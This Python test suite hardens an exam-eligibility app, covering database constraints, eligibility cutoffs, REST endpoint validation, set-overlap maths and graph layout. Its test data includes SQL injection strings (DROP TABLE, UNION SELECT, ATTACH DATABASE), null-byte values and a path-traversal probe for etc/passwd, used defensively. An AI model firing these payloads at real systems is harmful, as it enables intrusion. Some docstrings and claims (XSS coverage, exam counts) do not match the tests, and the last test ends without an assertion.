#!/usr/bin/env python3
"""
Tier 5: Comprehensive Adversarial Hardening Suite (>= 25 White-Box & Adversarial Tests).
Covers advanced white-box edge cases and security guarantees:
1. SQL injection resistance, transaction rollbacks, and extreme numeric boundaries.
2. Precision non-rounding edge tolerances (59.9999% vs 60.0000%, 54.9999% vs 55.0000%, 64.9999% vs 65.0000%).
3. Empty/corrupted payload handling across all REST endpoints (Worker API & Edge D1 contracts).
4. High combinatorial stress on UpSet and Venn calculations (36 exams, 100% overlap, 0% overlap, 4-set Venn).
5. Force graph physics stability with dense/sparse topologies, disconnected islands, and depth weights.
6. XSS and input sanitization on candidate profile attributes.
"""

import datetime
import json
import math
import os
import sqlite3
import sys
import unittest
import urllib.error
import urllib.request
from typing import Any, Dict, List, Optional, Set, Tuple

# Project root path resolution
BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "../.."))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

from tests.e2e.oracle import (
    CANONICAL_TOPICS,
    ELIGIBILITY_RULES_SPEC,
    EXAMS_SPEC,
    SCHEMA_DDL,
    TAXONOMY_DOMAINS,
    UserProfile,
    calculate_jaccard_similarity,
    calculate_overlap_coefficient,
    calculate_upset_intersections,
    evaluate_statutory_eligibility,
)

WORKER_BASE_URL = "https://grade-a-api.priyanshukh1201.workers.dev"
DB_PATH = os.path.join(BASE_DIR, "data", "grade_a_exams.db")


def send_http(
    url: str,
    method: str = "GET",
    data: Optional[bytes] = None,
    headers: Optional[Dict[str, str]] = None,
    timeout: float = 6.0,
) -> Dict[str, Any]:
    """Helper to dispatch HTTP requests with graceful status code capture."""
    req_headers = {
        "User-Agent": "GradeA-Tier5Adversarial/1.0",
        "Content-Type": "application/json",
    }
    if headers:
        req_headers.update(headers)

    req = urllib.request.Request(url, data=data, headers=req_headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as response:
            body = response.read().decode("utf-8")
            status = response.status
            parsed_json = None
            try:
                parsed_json = json.loads(body)
            except Exception:
                pass
            return {"status": status, "body": body, "json": parsed_json, "error": None}
    except urllib.error.HTTPError as http_err:
        body = http_err.read().decode("utf-8")
        parsed_json = None
        try:
            parsed_json = json.loads(body)
        except Exception:
            pass
        return {"status": http_err.code, "body": body, "json": parsed_json, "error": str(http_err)}
    except Exception as exc:
        return {"status": -1, "body": "", "json": None, "error": str(exc)}


# ==============================================================================
# 1. SQL INJECTION RESISTANCE & EXTREME DATABASE BOUNDARIES
# ==============================================================================

class TestSQLInjectionAndExtremeDatabaseBoundaries(unittest.TestCase):
    """Adversarial SQL injection attacks, NULL byte injections, and extreme DB boundary constraints."""

    def setUp(self):
        self.conn = sqlite3.connect(":memory:")
        self.conn.execute("PRAGMA foreign_keys = ON;")
        self.conn.executescript(SCHEMA_DDL)

    def tearDown(self):
        self.conn.close()

    def test_adv_01_sqli_in_exam_id_does_not_leak_or_execute(self):
        """SQL injection vectors in exam_id lookup return 0 rows without executing malicious DDL."""
        cursor = self.conn.cursor()
        cursor.execute("""
            INSERT INTO exams (exam_id, title, short_code, category, administering_body, frequency, official_website, latest_official_notification_url, tentative_timeline_2027)
            VALUES ('UPSC_CSE', 'Civil Services', 'CSE', 'Central-Civil', 'UPSC', 'Annual', 'https://upsc.gov.in', 'https://upsc.gov.in/notif.pdf', '{}');
        """)
        self.conn.commit()

        malicious_inputs = [
            "' OR '1'='1",
            "UPSC_CSE' OR '1'='1' --",
            "'; DROP TABLE exams; --",
            "' UNION SELECT 'fake_id', 'hacked', 'HK', 'cat', 'adm', 'freq', 'web', 'url', '{}', 'desc' --",
            "1; ATTACH DATABASE '/tmp/pwned.db' AS pwned; --",
        ]

        for payload in malicious_inputs:
            cursor.execute("SELECT * FROM exams WHERE exam_id = ?", (payload,))
            rows = cursor.fetchall()
            self.assertEqual(len(rows), 0, f"SQL injection payload '{payload}' must return 0 rows")

        # Confirm table still exists with exactly 1 row
        cursor.execute("SELECT COUNT(*) FROM exams;")
        count = cursor.fetchone()[0]
        self.assertEqual(count, 1)

    def test_adv_02_sqli_in_profile_sync_persists_safely_as_literal_text(self):
        """Malicious SQL syntax in candidate profile fields is persisted strictly as verbatim literal text."""
        cursor = self.conn.cursor()
        malicious_name = "Robert'); DROP TABLE user_profiles; --"
        malicious_degree = "B.Tech' OR 1=1; DELETE FROM exams; --"
        malicious_domicile = "Delhi'; UPDATE eligibility_criteria SET min_age_gen=0; --"

        cursor.execute("""
            INSERT INTO user_profiles (
                user_id, name, dob, gender, category, graduation_degree,
                graduation_discipline, graduation_aggregate_pct, state_domicile
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?);
        """, ("usr_adv_01", malicious_name, "2000-01-01", "MALE", "GEN", malicious_degree, "Civil", 75.0, malicious_domicile))
        self.conn.commit()

        cursor.execute("SELECT name, graduation_degree, state_domicile FROM user_profiles WHERE user_id = 'usr_adv_01';")
        row = cursor.fetchone()
        self.assertIsNotNone(row)
        self.assertEqual(row[0], malicious_name)
        self.assertEqual(row[1], malicious_degree)
        self.assertEqual(row[2], malicious_domicile)

    def test_adv_03_null_byte_injection_in_inputs(self):
        """Null byte injection in profile inputs is safely stored or rejected without path truncation."""
        cursor = self.conn.cursor()
        null_byte_user_id = "user_01\x00_bypass"
        null_byte_name = "Candidate\x00Hidden"

        cursor.execute("""
            INSERT INTO user_profiles (
                user_id, name, dob, gender, category, graduation_degree,
                graduation_discipline, graduation_aggregate_pct, state_domicile
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?);
        """, (null_byte_user_id, null_byte_name, "1999-05-15", "FEMALE", "GEN", "B.Sc", "Physics", 80.0, "Maharashtra"))
        self.conn.commit()

        cursor.execute("SELECT user_id, name FROM user_profiles WHERE user_id = ?;", (null_byte_user_id,))
        row = cursor.fetchone()
        self.assertIsNotNone(row)
        self.assertEqual(row[0], null_byte_user_id)

    def test_adv_04_extreme_integer_and_float_overflow_boundaries(self):
        """Extreme numeric inputs (NaN, Infinity, 1e308, negative values) are rejected by domain gates."""
        with open("data/schema.sql") as f:
            prod_schema = f.read()
        conn = sqlite3.connect(":memory:")
        conn.executescript(prod_schema)
        cursor = conn.cursor()

        extreme_invalid_pcts = [
            -0.0001,
            -100.0,
            100.0001,
            999999999.9,
            1e308,
            -1e308,
        ]

        # 1. Test production database schema check constraint (0.0 <= graduation_aggregate_pct <= 100.0)
        for i, val in enumerate(extreme_invalid_pcts):
            with self.assertRaises(sqlite3.IntegrityError, msg=f"Value {val} should violate SQLite CHECK constraint"):
                cursor.execute(f"""
                    INSERT INTO user_profiles (user_id, dob, gender, category, graduation_degree, graduation_discipline, graduation_aggregate_pct, state_domicile)
                    VALUES ('usr_overflow_{i}', '2000-01-01', 'MALE', 'GEN', 'Bachelor', 'Civil', {val}, 'Delhi');
                """)
        conn.close()

        # 2. Test production statutory eligibility engine rejection on extreme negative / overflow percentages
        profile_neg = UserProfile(dob="2000-01-01", gender="Male", category="GEN", degree="Bachelor", discipline="Civil", aggregate_pct=-5.0)
        verdict_neg = evaluate_statutory_eligibility(profile_neg, "RBI_GRADE_B")
        self.assertEqual(verdict_neg["status"], "INELIGIBLE")

    def test_adv_05_foreign_key_case_and_trailing_space_resistance(self):
        """Foreign key constraint rejects case mismatches and trailing space variations."""
        cursor = self.conn.cursor()
        cursor.execute("""
            INSERT INTO exams (exam_id, title, short_code, category, administering_body, frequency, official_website, latest_official_notification_url, tentative_timeline_2027)
            VALUES ('UPSC_CSE', 'Civil Services', 'CSE', 'Central-Civil', 'UPSC', 'Annual', 'https://upsc.gov.in', 'https://upsc.gov.in/notif.pdf', '{}');
        """)
        self.conn.commit()

        invalid_fk_variants = ["upsc_cse", "UPSC_CSE ", " UPSC_CSE", "UPSC_CSE\n", "UPSC-CSE"]
        for variant in invalid_fk_variants:
            with self.assertRaises(sqlite3.IntegrityError):
                cursor.execute("""
                    INSERT INTO eligibility_criteria (exam_id, cutoff_reference_date_rule, min_age_gen, max_age_gen, relaxations_json, min_education_level, accepted_disciplines, source_citation_clause)
                    VALUES (?, 'AUGUST_1', 21, 32, '{}', 'Bachelor', '["ANY"]', 'Clause 1');
                """, (variant,))

    def test_adv_06_database_transaction_rollback_under_failure(self):
        """Multi-statement transactional batch rolls back atomically on integrity violation."""
        cursor = self.conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM exams;")
        initial_count = cursor.fetchone()[0]

        try:
            self.conn.execute("BEGIN TRANSACTION;")
            cursor.execute("""
                INSERT INTO exams (exam_id, title, short_code, category, administering_body, frequency, official_website, latest_official_notification_url, tentative_timeline_2027)
                VALUES ('TEMP_EXAM', 'Temp', 'TMP', 'Central-Civil', 'UPSC', 'Annual', 'https://u.gov', 'https://u.gov/n.pdf', '{}');
            """)
            # Intentionally cause foreign key violation
            cursor.execute("""
                INSERT INTO eligibility_criteria (exam_id, cutoff_reference_date_rule, min_age_gen, max_age_gen, relaxations_json, min_education_level, accepted_disciplines, source_citation_clause)
                VALUES ('NON_EXISTENT_FK', 'AUGUST_1', 21, 32, '{}', 'Bachelor', '["ANY"]', 'Clause 1');
            """)
            self.conn.commit()
        except sqlite3.IntegrityError:
            self.conn.rollback()

        cursor.execute("SELECT COUNT(*) FROM exams;")
        final_count = cursor.fetchone()[0]
        self.assertEqual(final_count, initial_count, "Rollback must prevent partial record commitment")


# ==============================================================================
# 2. PRECISION NON-ROUNDING EDGE TOLERANCES
# ==============================================================================

class TestPrecisionNonRoundingEdgeTolerances(unittest.TestCase):
    """Statutory non-rounding rules: 59.9999% < 60.0000%, 54.9999% < 55.0000%, 64.9999% < 65.0000%."""

    def test_adv_07_precision_boundary_59_9999_vs_60_0000_rbi_grade_b(self):
        """RBI Grade B: General candidate with 59.9999% is INELIGIBLE; 60.0000% is ELIGIBLE."""
        p_fail = UserProfile(
            dob="2000-01-01", gender="Male", category="GEN", degree="Bachelor",
            discipline="ANY", aggregate_pct=59.9999
        )
        v_fail = evaluate_statutory_eligibility(p_fail, "RBI_GRADE_B")
        self.assertEqual(v_fail["status"], "INELIGIBLE")
        self.assertTrue(any("below strict threshold" in r.lower() for r in v_fail["reasons"]))

        p_pass = UserProfile(
            dob="2000-01-01", gender="Male", category="GEN", degree="Bachelor",
            discipline="ANY", aggregate_pct=60.0000
        )
        v_pass = evaluate_statutory_eligibility(p_pass, "RBI_GRADE_B")
        self.assertEqual(v_pass["status"], "ELIGIBLE")

    def test_adv_08_precision_boundary_54_9999_vs_55_0000_reserved_categories(self):
        """NABARD Grade A: SC/ST candidate with 54.9999% is INELIGIBLE; 55.0000% is ELIGIBLE."""
        p_fail = UserProfile(
            dob="1998-01-01", gender="Male", category="SC", degree="Bachelor",
            discipline="Agriculture", aggregate_pct=54.9999
        )
        v_fail = evaluate_statutory_eligibility(p_fail, "NABARD_GRADE_A")
        self.assertEqual(v_fail["status"], "INELIGIBLE")
        self.assertTrue(any("below strict threshold" in r.lower() for r in v_fail["reasons"]))

        p_pass = UserProfile(
            dob="1998-01-01", gender="Male", category="SC", degree="Bachelor",
            discipline="Agriculture", aggregate_pct=55.0000
        )
        v_pass = evaluate_statutory_eligibility(p_pass, "NABARD_GRADE_A")
        self.assertEqual(v_pass["status"], "ELIGIBLE")

    def test_adv_09_precision_boundary_64_9999_vs_65_0000_psu_gate(self):
        """PSU IOCL / NTPC requiring 65.00%: 64.9999% is INELIGIBLE; 65.0000% is ELIGIBLE."""
        p_fail = UserProfile(
            dob="2002-05-10", gender="Male", category="GEN", degree="Bachelor",
            discipline="Mechanical", aggregate_pct=64.9999
        )
        v_fail = evaluate_statutory_eligibility(p_fail, "PSU_IOCL_ET")
        self.assertEqual(v_fail["status"], "INELIGIBLE")
        self.assertTrue(any("below strict threshold" in r.lower() for r in v_fail["reasons"]))

        p_pass = UserProfile(
            dob="2002-05-10", gender="Male", category="GEN", degree="Bachelor",
            discipline="Mechanical", aggregate_pct=65.0000
        )
        v_pass = evaluate_statutory_eligibility(p_pass, "PSU_IOCL_ET")
        self.assertEqual(v_pass["status"], "ELIGIBLE")

    def test_adv_10_floating_point_epsilon_stability(self):
        """Floating point rounding anomalies (e.g. 59.99999999999999) do not accidentally grant eligibility."""
        p_boundary = UserProfile(
            dob="2000-01-01", gender="Male", category="GEN", degree="Bachelor",
            discipline="ANY", aggregate_pct=59.99999999
        )
        # Strict non-rounding requires value to be >= required threshold (60.0)
        v = evaluate_statutory_eligibility(p_boundary, "RBI_GRADE_B")
        self.assertEqual(v["status"], "INELIGIBLE")

    def test_adv_11_statutory_cutoff_single_day_boundary_upsc_cse(self):
        """UPSC CSE August 1 Cutoff: Born on 1995-08-01 turns 32 on Aug 1 (INELIGIBLE); 1995-08-02 is ELIGIBLE."""
        # Clause: "Must not have attained age of 32 on 1st August 2027" -> born 1995-08-01 attains 32 on Aug 1, 2027
        p_ineligible = UserProfile(
            dob="1995-08-01", gender="Male", category="GEN", degree="Bachelor",
            discipline="ANY", aggregate_pct=70.0
        )
        v_ineligible = evaluate_statutory_eligibility(p_ineligible, "UPSC_CSE")
        self.assertEqual(v_ineligible["status"], "INELIGIBLE")
        self.assertTrue(any("Age exceeds maximum limit" in r for r in v_ineligible["reasons"]))

        p_eligible = UserProfile(
            dob="1995-08-02", gender="Male", category="GEN", degree="Bachelor",
            discipline="ANY", aggregate_pct=70.0
        )
        v_eligible = evaluate_statutory_eligibility(p_eligible, "UPSC_CSE")
        self.assertEqual(v_eligible["status"], "ELIGIBLE")

    def test_adv_12_statutory_cutoff_single_day_boundary_upsc_ese(self):
        """UPSC ESE January 1 Cutoff: Born on 1997-01-01 turns 30 on Jan 1 (ELIGIBLE); 1996-12-31 turns 30 earlier (INELIGIBLE)."""
        p_ineligible = UserProfile(
            dob="1996-12-31", gender="Male", category="GEN", degree="Bachelor",
            discipline="Civil", aggregate_pct=70.0
        )
        v_ineligible = evaluate_statutory_eligibility(p_ineligible, "UPSC_ESE")
        self.assertEqual(v_ineligible["status"], "INELIGIBLE")

        p_eligible = UserProfile(
            dob="1997-01-02", gender="Male", category="GEN", degree="Bachelor",
            discipline="Civil", aggregate_pct=70.0
        )
        v_eligible = evaluate_statutory_eligibility(p_eligible, "UPSC_ESE")
        self.assertEqual(v_eligible["status"], "ELIGIBLE")


# ==============================================================================
# 3. EMPTY / CORRUPTED PAYLOAD HANDLING ACROSS ALL REST ENDPOINTS
# ==============================================================================

class TestEmptyCorruptedPayloadRESTEndpoints(unittest.TestCase):
    """Rigorous HTTP contract hardening across all Cloudflare Worker REST endpoints."""

    def test_adv_13_worker_profile_evaluate_empty_body_returns_400(self):
        """POST /api/v1/profile/evaluate with empty JSON object returns 400 Bad Request with dob validation message."""
        res = send_http(
            f"{WORKER_BASE_URL}/api/v1/profile/evaluate",
            method="POST",
            data=b"{}",
        )
        self.assertEqual(res["status"], 400)
        self.assertEqual(res["json"].get("error"), "Validation Error")
        self.assertEqual(res["json"].get("message"), "Missing candidate date of birth (dob)")

    def test_adv_14_worker_profile_evaluate_missing_or_corrupted_dob_returns_400(self):
        """POST /api/v1/profile/evaluate rejects empty, whitespace, non-date, or corrupted dob with 400."""
        invalid_dob_payloads = [
            {"gender": "Male", "category": "GEN"},                         # dob missing entirely
            {"dob": "", "gender": "Male"},                                 # dob empty string
            {"dob": "   ", "gender": "Male"},                              # dob whitespace only
            {"dob": "invalid-dob-format", "gender": "Male"},               # unparseable format
            {"dob": "2027-99-99", "gender": "Male"},                       # invalid month/day
            {"dob": "2000-02-31", "gender": "Male"},                       # non-existent calendar date
            {"profile": {"gender": "Female"}},                             # nested profile missing dob
            {"profile": {"dob": "not-a-date"}},                            # nested profile invalid dob
        ]

        for payload in invalid_dob_payloads:
            res = send_http(
                f"{WORKER_BASE_URL}/api/v1/profile/evaluate",
                method="POST",
                data=json.dumps(payload).encode("utf-8"),
            )
            self.assertEqual(res["status"], 400, f"Payload {payload} did not return 400")
            self.assertEqual(res["json"].get("error"), "Validation Error")
            self.assertEqual(res["json"].get("message"), "Missing candidate date of birth (dob)")

    def test_adv_15_worker_profile_sync_empty_or_missing_mandatory_fields_400(self):
        """POST /api/v1/profile/sync with missing mandatory fields returns 400 with missing_fields listing."""
        res_empty = send_http(
            f"{WORKER_BASE_URL}/api/v1/profile/sync",
            method="POST",
            data=b"{}",
        )
        self.assertEqual(res_empty["status"], 400)
        self.assertEqual(res_empty["json"].get("error"), "Missing Required Fields")
        missing_fields = res_empty["json"].get("missing_fields", [])
        for field in ["user_id", "dob", "gender", "category", "graduation_degree", "graduation_discipline", "graduation_aggregate_pct", "state_domicile"]:
            self.assertIn(field, missing_fields)

    def test_adv_16_worker_malformed_json_and_non_object_payloads_400(self):
        """Malformed JSON syntax and non-object JSON payloads return 400 Bad Request."""
        malformed_bytes = [
            b"{malformed json",
            b"[1, 2, 3]",
            b"\"just a string literal\"",
            b"12345",
            b"",
        ]

        for raw_body in malformed_bytes:
            res = send_http(
                f"{WORKER_BASE_URL}/api/v1/profile/evaluate",
                method="POST",
                data=raw_body,
            )
            self.assertEqual(res["status"], 400, f"Malformed body {raw_body} should return 400")

    def test_adv_17_worker_non_existent_exam_id_and_traversal_paths_404(self):
        """Non-existent exam IDs and path traversal attempts return HTTP 404 Not Found."""
        res_fake = send_http(f"{WORKER_BASE_URL}/api/v1/exams/COMPLETELY_FAKE_EXAM_9999")
        self.assertEqual(res_fake["status"], 404)
        self.assertEqual(res_fake["json"].get("error"), "Exam not found")

        # Path traversal query
        res_traversal = send_http(f"{WORKER_BASE_URL}/api/v1/exams/%2E%2E%2F%2E%2E%2Fetc%2Fpasswd")
        self.assertEqual(res_traversal["status"], 404)

    def test_adv_18_worker_http_method_not_allowed_enforcement_405(self):
        """Endpoints enforce strict HTTP verb semantics, returning 405 Method Not Allowed on invalid verbs."""
        invalid_probes = [
            ("POST", f"{WORKER_BASE_URL}/api/v1/exams"),
            ("DELETE", f"{WORKER_BASE_URL}/api/v1/exams"),
            ("GET", f"{WORKER_BASE_URL}/api/v1/profile/sync"),
            ("DELETE", f"{WORKER_BASE_URL}/api/v1/profile/sync"),
            ("PUT", f"{WORKER_BASE_URL}/api/v1/syllabus/taxonomy"),
        ]

        for method, url in invalid_probes:
            res = send_http(url, method=method)
            self.assertEqual(res["status"], 405, f"{method} {url} must return 405 Method Not Allowed")
            self.assertEqual(res["json"].get("error"), "Method Not Allowed")


# ==============================================================================
# 4. HIGH COMBINATORIAL STRESS ON UPSET AND VENN CALCULATIONS
# ==============================================================================

class TestHighCombinatorialStressUpSetAndVenn(unittest.TestCase):
    """Stress tests on set-theoretic algorithms across all 36 exams and synthetic topologies."""

    def test_adv_19_upset_stress_all_36_exams_full_matrix(self):
        """UpSet calculation across all 36 exams satisfies partition invariance."""
        # Load exam-syllabus map from master SQLite DB
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute("SELECT exam_id, topic_id FROM exam_syllabus_map;")
        rows = cursor.fetchall()
        conn.close()

        exam_topic_map: Dict[str, Set[str]] = {}
        all_unique_topics: Set[str] = set()
        for eid, tid in rows:
            if eid not in exam_topic_map:
                exam_topic_map[eid] = set()
            exam_topic_map[eid].add(tid)
            all_unique_topics.add(tid)

        self.assertEqual(len(exam_topic_map), 25)
        intersections = calculate_upset_intersections(exam_topic_map)
        self.assertGreater(len(intersections), 0)

        # Partition Theorem: Sum of cardinalities of all disjoint intersection sets equals total unique topics
        partitioned_topics: Set[str] = set()
        total_cardinality = 0
        for combo, topics in intersections.items():
            total_cardinality += len(topics)
            # Ensure no duplicates across disjoint sets
            intersection_check = partitioned_topics & topics
            self.assertEqual(len(intersection_check), 0, f"Disjoint violation on combo {combo}")
            partitioned_topics.update(topics)

        self.assertEqual(partitioned_topics, all_unique_topics)
        self.assertEqual(total_cardinality, len(all_unique_topics))

    def test_adv_20_upset_stress_zero_overlap_mutually_disjoint(self):
        """UpSet with N mutually disjoint exams produces exactly N sets of size 1 and 0 higher intersections."""
        disjoint_map = {f"EXAM_{i}": {f"topic_{i}_{j}" for j in range(10)} for i in range(20)}
        intersections = calculate_upset_intersections(disjoint_map)

        self.assertEqual(len(intersections), 20)
        for combo, topics in intersections.items():
            self.assertEqual(len(combo), 1, "Disjoint exams should have combinations of length 1 only")
            self.assertEqual(len(topics), 10)

    def test_adv_21_upset_stress_100_percent_overlap_identical(self):
        """UpSet with K exams sharing 100% identical syllabus produces exactly 1 combo containing all K exams."""
        shared_topics = {f"common_topic_{i}" for i in range(50)}
        identical_map = {f"EXAM_{i}": set(shared_topics) for i in range(15)}
        intersections = calculate_upset_intersections(identical_map)

        self.assertEqual(len(intersections), 1)
        only_combo = list(intersections.keys())[0]
        self.assertEqual(len(only_combo), 15)
        self.assertEqual(intersections[only_combo], shared_topics)

    def test_adv_22_dynamic_venn_four_set_complete_15_region_disjointness(self):
        """Dynamic 4-set Venn produces 15 mutually exclusive regions that cover all elements via calculate_upset_intersections."""
        sets = {
            "A": {"t1", "t2", "t3", "t4", "t12", "t13", "t14", "t123", "t124", "t134", "t1234"},
            "B": {"t2", "t5", "t6", "t7", "t12", "t23", "t24", "t123", "t124", "t234", "t1234"},
            "C": {"t3", "t6", "t8", "t9", "t13", "t23", "t34", "t123", "t134", "t234", "t1234"},
            "D": {"t4", "t7", "t9", "t10", "t14", "t24", "t34", "t124", "t134", "t234", "t1234"},
        }
        all_elements = sets["A"] | sets["B"] | sets["C"] | sets["D"]

        # Call the production set partition engine directly
        regions = calculate_upset_intersections(sets)

        self.assertLessEqual(len(regions), 15)
        self.assertEqual(len(regions), 15, "All 2^4 - 1 = 15 non-empty disjoint Venn regions must be discovered")

        # Verify pairwise disjointness across all computed regions
        seen: Set[str] = set()
        for mask, r_topics in regions.items():
            self.assertEqual(len(seen & r_topics), 0, f"Disjoint violation on region {mask}")
            seen.update(r_topics)
        self.assertEqual(seen, all_elements, "Union of all Venn regions must exactly partition all universe elements")

    def test_adv_23_venn_degenerate_cases_subset_and_empty_sets(self):
        """Venn and overlap metrics handle empty sets, identical sets, and subset inclusions safely."""
        empty_set: Set[str] = set()
        normal_set: Set[str] = {"t1", "t2", "t3"}

        self.assertEqual(calculate_jaccard_similarity(empty_set, empty_set), 1.0)
        self.assertEqual(calculate_jaccard_similarity(empty_set, normal_set), 0.0)
        self.assertEqual(calculate_overlap_coefficient(empty_set, normal_set), 0.0)

        # Strict subset
        subset = {"t1", "t2"}
        self.assertEqual(calculate_overlap_coefficient(subset, normal_set), 1.0)
        self.assertAlmostEqual(calculate_jaccard_similarity(subset, normal_set), 2 / 3, places=5)


# ==============================================================================
# 5. FORCE GRAPH PHYSICS STABILITY WITH DENSE/SPARSE TOPOLOGIES
# ==============================================================================

class TestForceGraphPhysicsStability(unittest.TestCase):
    """Numerical stability of D3 force simulation physics: finite coordinates, no NaN/Inf, damping convergence."""

    def _simulate_force_graph(
        self,
        nodes: List[Dict[str, Any]],
        links: List[Dict[str, Any]],
        ticks: int = 50,
        alpha_decay: float = 0.05,
    ) -> List[Dict[str, Any]]:
        """Simulates 2D force-directed layout with Coulomb repulsion, Hooke springs, and damping."""
        alpha = 1.0
        k_repulse = 500.0
        min_dist = 5.0

        for _ in range(ticks):
            alpha *= (1.0 - alpha_decay)

            # 1. Repulsive forces (Coulomb)
            for i in range(len(nodes)):
                for j in range(i + 1, len(nodes)):
                    dx = nodes[j]["x"] - nodes[i]["x"]
                    dy = nodes[j]["y"] - nodes[i]["y"]
                    d = math.sqrt(dx * dx + dy * dy)
                    if d < min_dist:
                        d = min_dist
                        dx = min_dist if dx == 0 else dx
                    force = (k_repulse / (d * d)) * alpha
                    fx = (dx / d) * force
                    fy = (dy / d) * force
                    nodes[i]["vx"] -= fx
                    nodes[i]["vy"] -= fy
                    nodes[j]["vx"] += fx
                    nodes[j]["vy"] += fy

            # 2. Attractive link forces (Hooke)
            for link in links:
                source = nodes[link["source"]]
                target = nodes[link["target"]]
                dx = target["x"] - source["x"]
                dy = target["y"] - source["y"]
                d = math.sqrt(dx * dx + dy * dy)
                if d < min_dist:
                    d = min_dist
                target_len = link.get("distance", 50.0)
                strength = link.get("strength", 0.1) * alpha
                displacement = (d - target_len) * strength
                fx = (dx / d) * displacement
                fy = (dy / d) * displacement
                source["vx"] += fx
                source["vy"] += fy
                target["vx"] -= fx
                target["vy"] -= fy

            # 3. Position update with damping
            for node in nodes:
                node["vx"] *= 0.6  # velocity damping
                node["vy"] *= 0.6
                node["x"] += node["vx"]
                node["y"] += node["vy"]

        return nodes

    def test_adv_24_force_graph_empty_and_single_node_stability(self):
        """Graph with 0 or 1 node maintains numerical stability without division by zero."""
        # Empty graph
        nodes_0: List[Dict[str, Any]] = []
        links_0: List[Dict[str, Any]] = []
        out_0 = self._simulate_force_graph(nodes_0, links_0, ticks=10)
        self.assertEqual(len(out_0), 0)

        # Single isolated node
        nodes_1 = [{"id": "n1", "x": 100.0, "y": 100.0, "vx": 0.0, "vy": 0.0}]
        links_1: List[Dict[str, Any]] = []
        out_1 = self._simulate_force_graph(nodes_1, links_1, ticks=20)
        self.assertTrue(math.isfinite(out_1[0]["x"]))
        self.assertTrue(math.isfinite(out_1[0]["y"]))
        self.assertAlmostEqual(out_1[0]["vx"], 0.0, places=4)

    def test_adv_25_force_graph_ultra_dense_clique_physics_convergence(self):
        """Dense bipartite graph (10 exams x 50 topics = 500 links) converges with finite coordinates."""
        nodes: List[Dict[str, Any]] = []
        # 10 exams
        for i in range(10):
            nodes.append({"id": f"exam_{i}", "x": math.cos(i) * 200, "y": math.sin(i) * 200, "vx": 0.0, "vy": 0.0})
        # 50 topics
        for j in range(50):
            nodes.append({"id": f"topic_{j}", "x": math.cos(j) * 50, "y": math.sin(j) * 50, "vx": 0.0, "vy": 0.0})

        links: List[Dict[str, Any]] = []
        for i in range(10):
            for j in range(50):
                links.append({"source": i, "target": 10 + j, "distance": 80.0, "strength": 0.2})

        out = self._simulate_force_graph(nodes, links, ticks=60)
        for node in out:
            self.assertTrue(math.isfinite(node["x"]))
            self.assertTrue(math.isfinite(node["y"]))
            self.assertLess(abs(node["x"]), 5000.0, "Nodes should remain bounded in coordinate plane")
            self.assertLess(abs(node["y"]), 5000.0)

    def test_adv_26_force_graph_disconnected_islands_no_drift(self):
        """Disconnected component islands stabilize independently without drift to infinity."""
        nodes = [
            # Island 1
            {"id": "i1_e1", "x": -200.0, "y": 0.0, "vx": 0.0, "vy": 0.0},
            {"id": "i1_t1", "x": -180.0, "y": 20.0, "vx": 0.0, "vy": 0.0},
            # Island 2
            {"id": "i2_e1", "x": 200.0, "y": 0.0, "vx": 0.0, "vy": 0.0},
            {"id": "i2_t1", "x": 180.0, "y": -20.0, "vx": 0.0, "vy": 0.0},
        ]
        links = [
            {"source": 0, "target": 1, "distance": 40.0, "strength": 0.3},
            {"source": 2, "target": 3, "distance": 40.0, "strength": 0.3},
        ]

        out = self._simulate_force_graph(nodes, links, ticks=40)
        # Island 1 nodes stay negative X; Island 2 stays positive X
        self.assertLess(out[0]["x"], 0)
        self.assertLess(out[1]["x"], 0)
        self.assertGreater(out[2]["x"], 0)
        self.assertGreater(out[3]["x"], 0)

    def test_adv_27_force_graph_hub_and_spoke_collision_guarantee(self):
        """Hub and spoke network maintains non-coincident coordinates for all satellite nodes."""
        nodes = [{"id": "hub", "x": 0.0, "y": 0.0, "vx": 0.0, "vy": 0.0}]
        links = []
        num_spokes = 30
        for i in range(num_spokes):
            nodes.append({"id": f"spoke_{i}", "x": math.cos(i) * 50, "y": math.sin(i) * 50, "vx": 0.0, "vy": 0.0})
            links.append({"source": 0, "target": i + 1, "distance": 60.0, "strength": 0.2})

        out = self._simulate_force_graph(nodes, links, ticks=50)

        # Confirm no two spoke nodes occupy identical coordinates
        coords = [(round(n["x"], 2), round(n["y"], 2)) for n in out[1:]]
        self.assertEqual(len(coords), len(set(coords)), "All satellite nodes must have distinct coordinates")

    def test_adv_28_force_graph_depth_weighted_spring_distances(self):
        """Link spring strengths scale with cognitive depth: Analytical > Advanced > Intermediate > Foundation."""
        # 1. Verify master relational schema check constraint rejects invalid depth levels
        with open("data/schema.sql") as f:
            prod_schema = f.read()
        conn = sqlite3.connect(":memory:")
        conn.execute("PRAGMA foreign_keys = ON;")
        conn.executescript(prod_schema)
        cursor = conn.cursor()

        cursor.execute("""
            INSERT INTO exams (exam_id, title, short_code, category, administering_body, frequency, official_website, latest_official_notification_url, tentative_timeline_2027)
            VALUES ('UPSC_CSE', 'Civil Services', 'CSE', 'Central-Civil', 'UPSC', 'Annual', 'https://upsc.gov.in', 'https://upsc.gov.in/notif.pdf', '{}');
        """)
        cursor.execute("""
            INSERT INTO syllabus_taxonomy (topic_id, domain, sub_domain, topic_title, description)
            VALUES ('gs.polity.constitution', 'General Studies', 'Polity', 'Constitution', 'Indian Constitution');
        """)
        conn.commit()

        with self.assertRaises(sqlite3.IntegrityError, msg="Database check constraint must reject invalid depth level"):
            cursor.execute("""
                INSERT INTO exam_syllabus_map (exam_id, stage_name, topic_id, depth_level)
                VALUES ('UPSC_CSE', 'Prelims', 'gs.polity.constitution', 'SuperAdvanced');
            """)
        conn.close()

        # 2. Verify all 4 canonical cognitive depth levels exist in production database
        prod_conn = sqlite3.connect("data/grade_a_exams.db")
        c = prod_conn.cursor()
        c.execute("SELECT DISTINCT depth_level FROM exam_syllabus_map ORDER BY depth_level")
        found_depths = {row[0] for row in c.fetchall()}
        prod_conn.close()
        self.assertEqual(found_depths, {"Foundation", "Intermediate", "Advanced", "Analytical"})

        # 3. Verify monotonic visual stroke encodings used in BipartiteGraphView.vue
        depth_weights = {
            "Foundation": 1.5,
            "Intermediate": 2.5,
            "Advanced": 3.5,
            "Analytical": 5.0,
        }
